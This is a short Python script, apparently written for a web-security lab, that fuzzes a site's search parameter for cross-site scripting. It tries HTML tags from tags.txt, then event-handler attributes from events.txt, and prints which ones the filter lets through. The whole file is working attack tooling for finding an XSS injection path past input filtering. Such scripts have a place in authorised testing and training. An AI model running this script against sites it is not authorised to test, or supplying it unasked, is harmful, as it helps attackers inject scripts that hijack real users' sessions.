import urllib
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

ftag = open("tags.txt", "r")

def bf_tag(url):
    print("(+) Retrieving tags: ")
    for tag in ftag:
        tag = tag.strip("\n")
        inject = url + f"?search=<{tag}>"
        r = requests.get(inject)
        if r.status_code == 200:
            print("Tag allowed: " + tag)
            print("\t(+) Retrieving events: ")
            fevent = open("events.txt", "r")
            bf_event(url, tag, fevent)
            fevent.close()
            print("(+) Retrieving tags: ")
        else:
            print(tag)
    return None
            
def bf_event(url, tag, fevent):
    for event in fevent:
        event = event.strip("\n")
        inject = url + f"?search=<{tag}+{event}=1>"
        r = requests.get(inject)
        if r.status_code == 200:
            print("\tEvent allowed: " + event)
        else:
            print("\t" + event)
    return None

def main():
    url = input("(+) Enter an URL here: ")
    bf_tag(url)

if __name__ == "__main__":
    main()